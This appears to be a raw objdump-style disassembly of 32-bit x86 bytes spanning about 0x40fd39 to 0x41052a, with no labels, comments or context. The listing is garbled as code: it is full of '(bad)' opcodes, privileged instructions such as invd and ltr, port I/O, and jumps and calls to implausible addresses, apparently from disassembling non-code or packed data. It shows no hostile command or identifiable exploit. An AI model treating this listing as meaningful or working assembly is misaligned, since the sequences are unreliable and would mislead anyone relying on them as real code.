  40fd39:	add    edi,DWORD PTR [esi+0x708088b]
  40fd3f:	cmp    esi,eax
  40fd41:	setnp  BYTE PTR [ecx-0x74fcffce]
  40fd48:	mov    esp,edi
  40fd4a:	call   0x33cc429c
  40fd4f:	or     BYTE PTR [ebx],al
  40fd51:	inc    ecx
  40fd52:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  40fd58:	and    BYTE PTR [ebp-0x7074f0bb],al
  40fd5e:	lock add cl,al
  40fd61:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  40fd68:	mov    ch,0x45
  40fd6a:	clc    
  40fd6b:	xor    eax,DWORD PTR [ebp+0x3]
  40fd6e:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  40fd74:	inc    ebp
  40fd75:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  40fd7b:	mov    edi,eax
  40fd7d:	mov    eax,DWORD PTR [ebp+0x3c]
  40fd80:	mov    ecx,DWORD PTR [eax]
  40fd82:	hlt    
  40fd83:	inc    ebp
  40fd84:	ror    DWORD PTR [ebx+0x818c45],0xf4
  40fd8b:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  40fd91:	push   ebp
  40fd92:	mov    edi,DWORD PTR [ebx]
  40fd94:	in     al,dx
  40fd95:	jne    0x40fd58
  40fd97:	mov    eax,DWORD PTR [ebp-0x28]
  40fd9a:	add    DWORD PTR [eax],0xe8058dec
  40fda0:	clc    
  40fda1:	mov    esi,DWORD PTR [edi-0x8]
  40fda4:	add    dh,dl
  40fda6:	rol    WORD PTR [ebp-0x1],cl
  40fdaa:	mov    edx,DWORD PTR [eax+0x8]
  40fdad:	jne    0x40fd6f
  40fdaf:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  40fdb6:	inc    ebp
  40fdb7:	push   esp
  40fdb8:	test   DWORD PTR [ecx+0xf],ecx
  40fdbb:	sub    edx,esp
  40fdbd:	add    eax,DWORD PTR [eax]
  40fdbf:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  40fdc5:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  40fdcc:	mov    eax,DWORD PTR [ecx]
  40fdce:	and    BYTE PTR [eax],al
  40fdd0:	cmp    al,0x10
  40fdd2:	add    BYTE PTR [ebp+0x66],al
  40fdd5:	inc    ecx
  40fdd7:	push   esp
  40fdd8:	add    dh,BYTE PTR [ebp+0x0]
  40fddb:	push   edx
  40fddc:	enterw 0xc1,0x4d
  40fde1:	mov    esp,DWORD PTR [esi+0x20]
  40fde4:	add    DWORD PTR [ecx-0x7b],eax
  40fde7:	add    eax,DWORD PTR [ebx]
  40fde9:	str    WORD PTR [eax+0x45]
  40fded:	lea    ecx,[ebx+0x45890801]
  40fdf3:	sbb    BYTE PTR [ebx],al
  40fdf5:	dec    ebp
  40fdf6:	cmp    al,0xf
  40fdf8:	inc    ebp
  40fdf9:	push   eax
  40fdfa:	mov    esi,DWORD PTR [ebx]
  40fdfc:	push   eax
  40fdfd:	add    eax,eax
  40fdff:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  40fe06:	inc    ebp
  40fe07:	add    BYTE PTR [ecx],dh
  40fe09:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  40fe10:	(bad)  
  40fe11:	mov    ebx,eax
  40fe13:	loopne 0x40fe5a
  40fe15:	dec    ebp
  40fe16:	mov    ecx,DWORD PTR [edi]
  40fe18:	cld    
  40fe19:	push   eax
  40fe1a:	xchg   DWORD PTR [ebx],esi
  40fe1c:	add    DWORD PTR [ebx],ebp
  40fe1e:	add    BYTE PTR [ebx],ch
  40fe20:	or     BYTE PTR [ecx],bh
  40fe22:	dec    ecx
  40fe23:	loopne 0x40fe28
  40fe25:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  40fe2b:	push   ebp
  40fe2c:	add    DWORD PTR [ebx+0x55100800],eax
  40fe32:	dec    ebp
  40fe33:	jmp    0x40fdbe
  40fe35:	mov    esp,DWORD PTR [eax]
  40fe37:	sbb    dl,dl
  40fe39:	inc    eax
  40fe3a:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  40fe40:	add    BYTE PTR [ebx+0x74528555],cl
  40fe46:	push   ebp
  40fe47:	div    DWORD PTR [ebx]
  40fe49:	and    eax,DWORD PTR [ebx]
  40fe4b:	add    edx,DWORD PTR [edx-0x30]
  40fe4e:	jno    0x40fddb
  40fe50:	inc    DWORD PTR [eax+eiz*1]
  40fe53:	inc    ebp
  40fe54:	push   eax
  40fe55:	push   eax
  40fe56:	mov    esp,DWORD PTR [edi-0x74beff1c]
  40fe5c:	mov    edi,esp
  40fe5e:	push   eax
  40fe5f:	inc    ebp
  40fe60:	enter  0x458b,0x8
  40fe64:	push   ecx
  40fe65:	(bad)  
  40fe66:	call   0x10b083e
  40fe6b:	pop    ss
  40fe6c:	push   ebp
  40fe6d:	mov    ecx,DWORD PTR [ebx+0x489408]
  40fe73:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  40fe79:	push   ecx
  40fe7a:	jo     0x40fe64
  40fe7c:	inc    DWORD PTR [edi]
  40fe7e:	or     BYTE PTR [eax],al
  40fe80:	call   0xcc05ca
  40fe85:	fmul   QWORD PTR [ebp+0x55]
  40fe88:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  40fe8e:	mov    bh,0x8c
  40fe90:	adc    al,0x9b
  40fe92:	dec    esp
  40fe93:	xor    bl,BYTE PTR [eax]
  40fe95:	mov    ecx,DWORD PTR [ebp+0xc]
  40fe98:	mov    eax,DWORD PTR [ebp-0x4]
  40fe9b:	mov    esi,DWORD PTR [edi-0x3148f924]
  40fea1:	push   es
  40fea2:	retf   
  40fea3:	mov    BYTE PTR [ebp-0x30],0x3b
  40fea7:	inc    ebp
  40fea8:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  40feaf:	retf   0x83fc
  40feb2:	into   
  40feb3:	dec    ebp
  40feb4:	retf   
  40feb5:	mov    ecx,DWORD PTR [ebp-0x74]
  40feb8:	mov    eax,DWORD PTR [eax]
  40feba:	fdiv   QWORD PTR [ebx]
  40febc:	mov    bh,0x3
  40febe:	push   es
  40febf:	mov    esi,ecx
  40fec1:	sbb    cl,dl
  40fec3:	dec    ebp
  40fec4:	sar    DWORD PTR [ebx],cl
  40fec6:	push   ebp
  40fec7:	jne    0x40fed8
  40fec9:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  40fecf:	lea    ebx,[eax]
  40fed1:	call   0xf4ca8a98
  40fed6:	sbb    dh,dl
  40fed8:	add    edx,ebx
  40feda:	push   ebp
  40fedb:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  40fee1:	push   ecx
  40fee2:	mov    DWORD PTR [eax-0x30],edx
  40fee5:	test   DWORD PTR [edx],eax
  40fee7:	xadd   esp,esi
  40feea:	pop    es
  40feeb:	add    cl,dl
  40feed:	mov    eax,ecx
  40feef:	or     al,0x45
  40fef1:	(bad)  
  40fef2:	push   eax
  40fef3:	add    DWORD PTR [edx+0x0],eax
  40fef6:	add    ecx,DWORD PTR [ecx]
  40fef8:	and    dh,cl
  40fefa:	call   0xc507ca
  40feff:	add    DWORD PTR [ebp+0x0],edx
  40ff02:	mov    esp,DWORD PTR [ebp+0x18]
  40ff05:	add    BYTE PTR [eax+0x50],cl
  40ff08:	xor    eax,DWORD PTR [eax]
  40ff0a:	add    esp,DWORD PTR [esi+0x3b]
  40ff0d:	inc    ebp
  40ff0e:	je     0x40fe93
  40ff10:	push   ecx
  40ff11:	dec    BYTE PTR [ebp-0x77]
  40ff14:	add    eax,esi
  40ff16:	or     al,0x5e
  40ff18:	inc    eax
  40ff19:	add    BYTE PTR [ebx],al
  40ff1b:	data16 and BYTE PTR [ebp+0x50],al
  40ff1f:	sub    DWORD PTR [ecx],0xfffffff8
  40ff22:	add    BYTE PTR [ebp-0x75],ah
  40ff25:	add    BYTE PTR [eax],bl
  40ff27:	enter  0x894d,0x8b
  40ff2b:	int3   
  40ff2c:	loopne 0x40fef0
  40ff2e:	rol    BYTE PTR [eax],0x33
  40ff31:	lea    cx,[ebp+0xa]
  40ff35:	data16 jb 0x40ff7d
  40ff38:	add    BYTE PTR [ebx+0x44890855],cl
  40ff3e:	sbb    ah,al
  40ff40:	inc    ebp
  40ff41:	cmp    al,0xf
  40ff43:	add    BYTE PTR [edx+0x66],dl
  40ff46:	xor    ecx,DWORD PTR [eax]
  40ff48:	sub    eax,DWORD PTR [edx]
  40ff4a:	mov    eax,DWORD PTR [eax]
  40ff4c:	or     al,0x66
  40ff4e:	ror    edx,cl
  40ff50:	dec    ebp
  40ff51:	inc    ebp
  40ff52:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  40ff58:	cld    
  40ff59:	or     BYTE PTR [edi+0x4501dd],dl
  40ff5f:	ret    0xecce
  40ff62:	retf   
  40ff63:	(bad)  
  40ff64:	dec    ebp
  40ff65:	mov    al,0x8b
  40ff67:	loopne 0x40ff89
  40ff69:	cmp    ecx,DWORD PTR [edx]
  40ff6b:	inc    ebp
  40ff6c:	daa    
  40ff6d:	loopne 0x40fef6
  40ff6f:	in     al,dx
  40ff70:	add    edi,eax
  40ff72:	add    BYTE PTR [eax+0x3f52e155],bh
  40ff78:	push   ebp
  40ff79:	inc    ebp
  40ff7a:	xor    ebx,edx
  40ff7c:	add    ebp,esp
  40ff7e:	push   edx
  40ff7f:	push   bp
  40ff81:	inc    ebp
  40ff82:	(bad)  
  40ff83:	in     eax,dx
  40ff84:	push   esp
  40ff85:	(bad)  
  40ff86:	inc    edx
  40ff88:	sbb    al,0x33
  40ff8a:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  40ff91:	add    BYTE PTR [ebp+0x46],0x8b
  40ff95:	jmp    0xf98b:0x100041c8
  40ff9c:	xor    esi,DWORD PTR [edx+0x3]
  40ff9f:	mov    ecx,DWORD PTR [edi]
  40ffa1:	fmul   DWORD PTR [edx]
  40ffa3:	add    BYTE PTR [eax],al
  40ffa5:	lea    eax,[ebx-0x4700273c]
  40ffab:	add    al,0x4f
  40ffad:	pop    DWORD PTR [eax]
  40ffaf:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  40ffb5:	push   edx
  40ffb6:	inc    WORD PTR [ebp+0x8]
  40ffba:	mov    eax,0x514f4d
  40ffbf:	(bad)
  40ffc3:	add    al,al
  40ffc5:	xor    DWORD PTR [ebx-0x74baf730],eax
  40ffcb:	test   DWORD PTR [esi+0x74],esp
  40ffce:	inc    ebp
  40ffcf:	mov    DWORD PTR [eax+0xa4e08],edi
  40ffd5:	add    BYTE PTR [ecx-0x76c435bb],cl
  40ffdb:	or     dh,cl
  40ffdd:	or     eax,0x8b8d5045
  40ffe2:	inc    ebp
  40ffe3:	mov    WORD PTR [ecx+0x3b8a00],?
  40ffe9:	jne    0x41001e
  40ffeb:	mov    edi,DWORD PTR [edx+0x8f3b18]
  40fff1:	add    DWORD PTR [ebx],eax
  40fff3:	add    bh,bh
  40fff5:	adc    DWORD PTR [eax],ecx
  40fff7:	adc    DWORD PTR [ebp+0x55],edi
  40fffa:	push   es
  40fffb:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  410001:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  410008:	inc    ebp
  410009:	mov    esp,edi
  41000b:	or     al,0xda
  41000d:	push   eax
  41000e:	(bad)  
  41000f:	jne    0x40ffc5
  410011:	call   0x38f900
  410016:	inc    ebp
  410017:	sar    BYTE PTR [eax],0x84
  41001a:	in     al,dx
  41001b:	add    bh,al
  41001d:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  410024:	(bad)  
  410025:	and    al,al
  410027:	fs in  eax,dx
  410029:	inc    DWORD PTR [ebp-0x7b]
  41002c:	jle    0x41003d
  41002e:	leave  
  41002f:	scas   al,BYTE PTR es:[edi]
  410030:	inc    esp
  410031:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  410038:	or     BYTE PTR [ebx-0x97717c8],0x83
  41003f:	call   DWORD PTR [edi]
  410041:	shr    ah,0x84
  410044:	xchg   DWORD PTR [eax],eax
  410046:	add    DWORD PTR [eax],eax
  410048:	add    bh,bh
  41004a:	dec    ebp
  41004b:	and    BYTE PTR [ecx-0x38],dl
  41004e:	push   eax
  41004f:	dec    DWORD PTR [ebx+0xfd885]
  410055:	mov    BYTE PTR [ebp+0x508bac00],cl
  41005b:	mov    WORD PTR [ecx+0x0],ss
  41005e:	lea    ecx,[ebx+0x108b20d8]
  410064:	mov    WORD PTR [edx],ds
  410066:	add    BYTE PTR [edi+0xff01ff],al
  41006c:	mov    ecx,DWORD PTR [ebp-0x28]
  41006f:	push   ecx
  410070:	shl    BYTE PTR [ebp+0x3a],0x8b
  410074:	inc    ebp
  410075:	in     al,0xeb
  410077:	jno    0x410004
  410079:	push   edx
  41007a:	mov    DWORD PTR [eax-0x28],edx
  41007d:	mov    eax,DWORD PTR [ebp+0x20]
  410080:	je     0x410009
  410082:	mov    eax,DWORD PTR [ecx]
  410084:	sbb    BYTE PTR [eax],al
  410086:	pop    DWORD PTR [eax]
  410088:	add    esi,eax
  41008a:	add    bl,al
  41008c:	adc    DWORD PTR [edi],esi
  41008e:	jmp    0x8bcc50e0
  410093:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  41009a:	jne    0x410027
  41009c:	mov    ecx,DWORD PTR [eax]
  41009e:	in     al,0x75
  4100a0:	pop    DWORD PTR [ecx+0x5401]
  4100a6:	push   edx
  4100a7:	inc    DWORD PTR [ebx]
  4100a9:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4100af:	add    BYTE PTR [edi+0x9],dl
  4100b2:	call   DWORD PTR [esi]
  4100b4:	and    dl,al
  4100b6:	and    bh,bh
  4100b8:	inc    edi
  4100ba:	test   eax,edx
  4100bc:	sldt   ebx
  4100bf:	xor    al,BYTE PTR [eax]
  4100c1:	pushf  
  4100c2:	(bad)  
  4100c3:	jmp    0x4100d1
  4100c5:	mov    eax,edi
  4100c7:	or     al,0x75
  4100c9:	inc    eax
  4100ca:	call   0x40f7d2
  4100cf:	mov    eax,eax
  4100d1:	loopne 0x410057
  4100d3:	inc    ebp
  4100d4:	add    BYTE PTR [ebx+0x1451c00],cl
  4100da:	mov    eax,DWORD PTR [ebp+0x20]
  4100dd:	add    edi,ecx
  4100df:	add    BYTE PTR [eax],ch
  4100e1:	cmp    edi,0x18
  4100e4:	test   DWORD PTR [ebp+0xf],esi
  4100e7:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4100ee:	jne    0x4100f2
  4100f0:	call   0xff9ffbb5
  4100f5:	leave  
  4100f6:	rcr    BYTE PTR [esp+eax*4],0x55
  4100fa:	add    ah,ch
  4100fc:	add    BYTE PTR [edi-0x48fef979],dh
  410102:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  410109:	inc    esp
  41010a:	mov    ebx,DWORD PTR [eax]
  41010c:	fcom   st(2)
  41010e:	add    BYTE PTR [edi],bl
  410110:	lea    ecx,[eax-0x18]
  410113:	(bad)  
  410114:	push   DWORD PTR [ecx]
  410116:	call   0xffb34e78
  41011b:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  41011f:	fstp   DWORD PTR [esi+ebx*8]
  410122:	push   ebp
  410123:	pop    ebp
  410124:	mov    esi,DWORD PTR [edx-0x38]
  410127:	add    DWORD PTR [eax],0x28
  41012a:	mov    edi,DWORD PTR [ebx]
  41012c:	xor    esi,DWORD PTR [edx+0x3]
  41012f:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  410133:	pop    ebp
  410134:	or     al,0x4
  410136:	inc    ecx
  410137:	push   ebp
  410138:	(bad)  
  410139:	in     al,dx
  41013a:	or     ah,ch
  41013c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41013d:	xbegin 0xffc67733
  410143:	clc    
  410144:	adc    al,0x45
  410146:	div    BYTE PTR [edx]
  410148:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  41014f:	test   DWORD PTR [ebx+0x666300f8],ebx
  410155:	add    BYTE PTR [ecx+0x66],dh
  410158:	add    eax,DWORD PTR [ebp+0x52]
  41015b:	adc    eax,0xffffffa0
  41015e:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  410164:	test   DWORD PTR [eax],eax
  410166:	clc    
  410167:	data16 or al,BYTE PTR [ebp+0x45]
  41016b:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  410172:	rol    BYTE PTR [ebp+0x45],1
  410175:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  41017b:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  410181:	push   ebx
  410182:	add    BYTE PTR [eax+eax*1+0x51],dl
  410186:	jge    0x4101bb
  410188:	add    BYTE PTR [esi+0x4],dl
  41018b:	jne    0x4101f2
  41018d:	mov    edx,0x457200
  410192:	jmp    0x410156
  410194:	xor    edi,DWORD PTR [ebx]
  410196:	pop    edi
  410197:	cvtdq2ps xmm7,xmm0
  41019a:	ret    0x0
  41019d:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4101a3:	xor    ecx,DWORD PTR [edi]
  4101a5:	add    eax,DWORD PTR [ecx+0x3b]
  4101a8:	push   ebx
  4101a9:	rdpmc  
  4101ab:	out    0x8d,al
  4101ad:	add    BYTE PTR [eax],cl
  4101af:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4101b5:	ret    0x450c
  4101b8:	sbb    al,0x8b
  4101ba:	cmp    eax,esi
  4101bc:	or     cl,al
  4101be:	or     al,0xc2
  4101c0:	pop    eax
  4101c1:	inc    ebp
  4101c2:	add    ecx,DWORD PTR [edi]
  4101c4:	add    esi,DWORD PTR [ebp+0x39]
  4101c7:	invd   
  4101c9:	jge    0x4101d5
  4101cb:	mov    eax,0x478ac0
  4101d0:	cli    
  4101d1:	xor    esp,ecx
  4101d3:	mov    ebx,0x5b8ac0
  4101d8:	ret    0x33
  4101db:	mov    eax,0x833b8b
  4101e0:	sub    BYTE PTR [ebx],al
  4101e2:	inc    ebp
  4101e3:	xor    ax,di
  4101e6:	pushf  
  4101e7:	inc    bh
  4101e9:	mov    esp,esp
  4101eb:	hlt    
  4101ec:	test   DWORD PTR [ebp-0x8],esi
  4101ef:	mov    eax,DWORD PTR [ebp-0x14]
  4101f2:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4101f8:	dec    edi
  4101f9:	or     BYTE PTR [eax],al
  4101fb:	jne    0x410186
  4101fd:	mov    esi,esp
  4101ff:	call   0x77a78dc4
  410204:	inc    ebp
  410205:	mov    DWORD PTR [eax+0x9b4f0c],edi
  41020b:	add    BYTE PTR [ecx-0x3ffe0717],cl
  410211:	add    BYTE PTR [esi+0x7d],ah
  410214:	inc    ebp
  410215:	mov    bx,WORD PTR [ebp+0x8]
  410219:	add    DWORD PTR [ebp+0x54],0x30c008b
  410220:	inc    ebp
  410221:	mov    bx,di
  410224:	lock test BYTE PTR [ecx+0x7000801],bh
  41022b:	jge    0x4101ee
  41022d:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  410233:	cli    
  410234:	xor    bl,bh
  410236:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  41023c:	test   BYTE PTR [eax],cl
  41023e:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  410245:	cmp    ebp,eax
  410247:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  41024e:	test   BYTE PTR [ebp+0x1],bh
  410251:	mov    ebx,0x458a00
  410256:	xor    esi,DWORD PTR [ebx]
  410258:	add    esp,DWORD PTR [esi-0x77]
  41025b:	pop    ebp
  41025c:	loopne 0x4102c4
  41025e:	inc    ebp
  41025f:	clc    
  410260:	xor    edi,DWORD PTR [ebx]
  410262:	add    esi,DWORD PTR [edx-0x77]
  410265:	data16 fdivr QWORD PTR [ebp-0x49]
  410269:	mov    ebx,0xb78afc
  41026e:	hlt    
  41026f:	xor    edi,DWORD PTR [esi+eiz*2]
  410272:	add    BYTE PTR [ebp+0x66],bl
  410275:	data16 lock clc 
  410278:	cmp    al,0x3b
  41027a:	add    BYTE PTR [edi+0x66],dh
  41027d:	psubq  mm7,QWORD PTR [ebp+0x2]
  410281:	ltr    WORD PTR [ebp+0x66]
  410285:	add    esi,eax
  410287:	add    di,WORD PTR [ebp+0x2b]
  41028b:	data16 data16 jge 0x41030c
  41028f:	mov    ebx,0xe08a8b
  410294:	jge    0x4102c9
  410296:	data16 data16 xor al,0x5d
  41029a:	data16 data16 jne 0x410296
  41029e:	mov    edi,DWORD PTR [ebx]
  4102a0:	fdiv   QWORD PTR [edx+0x7d]
  4102a3:	data16 data16 jge 0x4102db
  4102a7:	mov    ebx,0x758a66
  4102ac:	mov    esi,0x667233
  4102b1:	pop    ebp
  4102b2:	or     BYTE PTR [esi+0x0],ah
  4102b5:	clc    
  4102b6:	mov    edi,DWORD PTR [ebx]
  4102b8:	lock ja 0x410246
  4102bb:	(bad)  
  4102bd:	jge    0x4102b6
  4102bf:	invd   
  4102c1:	pop    ebp
  4102c2:	add    BYTE PTR [ebx],al
  4102c4:	(bad)  
  4102c5:	cmp    di,WORD PTR [ebp+0xf]
  4102c9:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4102cd:	mov    bx,WORD PTR [ebp-0x10]
  4102d1:	pop    bp
  4102d3:	fbstp  TBYTE PTR [ebx]
  4102d5:	test   DWORD PTR [ebx],eax
  4102d7:	add    BYTE PTR [ebx],bh
  4102d9:	add    BYTE PTR [esi+0x7d],ah
  4102dc:	jge    0x410269
  4102de:	data16 in al,dx
  4102e0:	pop    ebp
  4102e1:	stc    
  4102e2:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4102e9:	mov    edi,ebx
  4102eb:	in     al,dx
  4102ec:	test   BYTE PTR [ebp+0x0],bh
  4102ef:	mov    eax,DWORD PTR [eax]
  4102f1:	call   0xbd3dfc81
  4102f6:	cmp    al,0x9b
  4102f8:	add    BYTE PTR [edx],dh
  4102fa:	mov    bx,di
  4102fd:	call   0x8b49808d
  410302:	add    ebp,esp
  410304:	mov    bx,di
  410307:	jnp    0x41032f
  410309:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  41030f:	mov    eax,DWORD PTR [eax]
  410311:	call   0x7c3c8e7c
  410316:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  41031c:	data16 data16 fistp WORD PTR [ebp+0xe]
  410321:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  41032b:	fisttp WORD PTR [ecx-0x7401f77b]
  410331:	(bad)  
  410332:	cld    
  410333:	jne    0x410371
  410335:	xor    eax,DWORD PTR [eax]
  410337:	mov    esp,DWORD PTR [esi-0x10]
  41033a:	sti    
  41033b:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  410342:	data16 adc bl,bh
  410345:	push   ebp
  410346:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  41034d:	mov    WORD PTR [eax],es
  41034f:	fwait
  410350:	data16 xor bh,bl
  410353:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  410359:	mov    esp,DWORD PTR [esi-0x14]
  41035c:	fisttp WORD PTR [ebx-0x3748a9f2]
  410362:	or     al,0x2b
  410364:	mov    bh,0xba
  410366:	hlt    
  410367:	mov    bh,bl
  410369:	add    BYTE PTR [ecx-0x7446f3cd],cl
  41036f:	dec    esi
  410370:	or     al,0x0
  410372:	mov    edi,DWORD PTR [ebx]
  410374:	or     BYTE PTR [ebp+0x3b],dh
  410377:	mov    ecx,DWORD PTR [edi]
  410379:	fdivr  QWORD PTR [ebx-0x7499ff83]
  41037f:	xor    al,0xd8
  410381:	pop    bp
  410383:	lock xor esi,DWORD PTR [ebx]
  410386:	lea    esp,[esi+0x1f]
  410389:	icebp  
  41038a:	jb     0x410390
  41038c:	add    al,al
  41038e:	jge    0x41039c
  410390:	mov    eax,eax
  410392:	fsubr  st,st(3)
  410394:	pop    ebp
  410395:	mov    esi,DWORD PTR [ebx]
  410397:	in     al,0x8d
  410399:	rcr    DWORD PTR [edi],0xc2
  41039c:	jb     0x4103fc
  41039e:	add    cl,cl
  4103a0:	jge    0x4103ae
  4103a2:	mov    edx,DWORD PTR [ebp-0x20]
  4103a5:	in     al,dx
  4103a6:	pop    ebp
  4103a7:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4103ac:	cmp    di,WORD PTR [ebp+0x0]
  4103b0:	mov    ebp,DWORD PTR [ebx]
  4103b2:	fdivr  QWORD PTR [esi+0x668a5d]
  4103b8:	cmp    al,0x33
  4103ba:	mov    si,0x4e7d
  4103be:	mov    eax,DWORD PTR [eax]
  4103c0:	lock inc ebp
  4103c2:	mov    esi,DWORD PTR [eax]
  4103c4:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4103cb:	clc    
  4103cc:	(bad)  
  4103cd:	cmp    edi,DWORD PTR [ebx]
  4103cf:	je     0x4103e0
  4103d1:	push   ebx
  4103d2:	loopne 0x4103e3
  4103d4:	dec    ecx
  4103d6:	mov    esp,DWORD PTR [ebp-0x1c]
  4103d9:	int    0xf1
  4103db:	mov    esi,0x703084d
  4103e0:	pcmpgtd mm6,mm1
  4103e3:	add    BYTE PTR [ebp+0x66],dh
  4103e6:	jmp    0x4103b3
  4103e8:	mov    eax,DWORD PTR [ebx]
  4103ea:	lock push ebp
  4103ec:	ror    DWORD PTR [ebp-0x2972feb3],1
  4103f2:	or     bh,dl
  4103f4:	jb     0x4103f4
  4103f6:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4103fc:	loopne 0x4103fe
  4103fe:	jne    0x410402
  410400:	data16 add BYTE PTR [esi+eiz*2],dh
  410404:	mov    ecx,ebx
  410406:	data16 cmp al,0xf1
  410409:	add    BYTE PTR [esi+eiz*2],bh
  41040c:	add    bl,cl
  41040e:	retw   0xf2
  410412:	ret    0x66
  410415:	retf   
  410416:	enterw 0x4df1,0x19
  41041b:	pop    edi
  41041c:	jne    0x41039f
  41041e:	mov    esi,DWORD PTR [eax]
  410420:	call   0x77b58fc1
  410425:	xor    ebp,DWORD PTR [ebx]
  410427:	lea    esp,[esi+0x48]
  41042a:	repnz in eax,0x3b
  41042d:	add    BYTE PTR [ebp-0x37],dh
  410430:	xor    edx,DWORD PTR [ebp-0x15]
  410433:	in     al,dx
  410434:	xor    edx,DWORD PTR [esi+0x40]
  410437:	mov    DWORD PTR [edi],0x338545fc
  41043d:	clc    
  41043e:	add    esi,DWORD PTR [ecx]
  410440:	pop    edi
  410441:	pushf  
  410442:	pop    ebx
  410443:	call   0xff42040a
  410448:	mov    edi,eax
  41044a:	push   ecx
  41044b:	pop    es
  41044c:	mov    edi,DWORD PTR [eax]
  41044e:	push   esi
  41044f:	inc    esi
  410450:	add    bh,BYTE PTR [esi+0x0]
  410453:	popa   
  410454:	data16 (bad) 
  410456:	into   
  410457:	gs cmp al,0xcd
  41045a:	add    BYTE PTR [ecx+0x7ce0866],bh
  410460:	ret    0x66
  410463:	add    bh,al
  410465:	add    bh,ah
  410467:	add    BYTE PTR [ebp+0x31c3f866],al
  41046d:	cmp    al,0x9c
  41046f:	add    BYTE PTR [esi+0x66],ah
  410472:	into   
  410473:	ret    
  410474:	pop    ebp
  410475:	adc    BYTE PTR [edi+0x0],dl
  410478:	mov    bh,0x66
  41047a:	mov    edi,0xff038dc3
  41047f:	jne    0x4104d5
  410481:	lea    edx,[ecx+0x1]
  410484:	mov    ebx,0xd64ff1
  410489:	sar    DWORD PTR [ebx],1
  41048b:	test   BYTE PTR [ebp+0x36],dh
  41048e:	mov    DWORD PTR [esp+edi*8-0x76],esp
  410492:	push   edi
  410493:	xor    BYTE PTR [ebx],0x38
  410496:	mov    esi,ebx
  410498:	xor    eax,DWORD PTR [eax-0x3c73819a]
  41049e:	ss inc ebp
  4104a0:	fs pop ebx
  4104a2:	mov    ebx,0x9c3b30
  4104a7:	je     0x4104d4
  4104a9:	xor    edi,DWORD PTR [ebx+0x668a33]
  4104af:	mov    WORD PTR [ebx],?
  4104b1:	ss mov ebx,0x8b4e64
  4104b7:	pop    edi
  4104b8:	cmp    ecx,ecx
  4104ba:	jne    0x410511
  4104bc:	mov    ebp,esp
  4104be:	cld    
  4104bf:	push   esi
  4104c0:	pop    ebx
  4104c1:	inc    ebp
  4104c2:	stc    
  4104c3:	xor    BYTE PTR [ebp+0x9bef89c],al
  4104c9:	test   esi,ecx
  4104cb:	clc    
  4104cc:	test   dl,dl
  4104ce:	cmp    bh,bh
  4104d0:	fs pop si
  4104d3:	or     bl,al
  4104d5:	add    cl,BYTE PTR [ebx+0x57665100]
  4104db:	retf   0x3c45
  4104de:	xor    BYTE PTR [eax],al
  4104e0:	pushf  
  4104e1:	mov    si,0x85ca
  4104e5:	ret    0xf8
  4104e8:	pop    ebx
  4104e9:	dec    dx
  4104ec:	mov    edx,DWORD PTR [edi-0x76]
  4104ef:	push   edi
  4104f0:	add    al,0xb7
  4104f2:	xor    al,0xba
  4104f4:	cmp    al,0x8d
  4104f6:	je     0x4104f7
  4104f8:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4104fc:	lea    edi,[ebx+0x544fff]
  410502:	push   ecx
  410503:	cmp    edx,DWORD PTR [ebx+0x75]
  410506:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  41050c:	add    BYTE PTR [ebx],dh
  41050e:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  410514:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  41051b:	mov    ebx,0x3b3b00
  410520:	jne    0x41054d
  410522:	mov    DWORD PTR [ebx+0x728afc],edi
  410528:	xor    esi,DWORD PTR [ebx]
  41052a:	mov    edi,DWORD PTR [ebx+0x8d4e33]
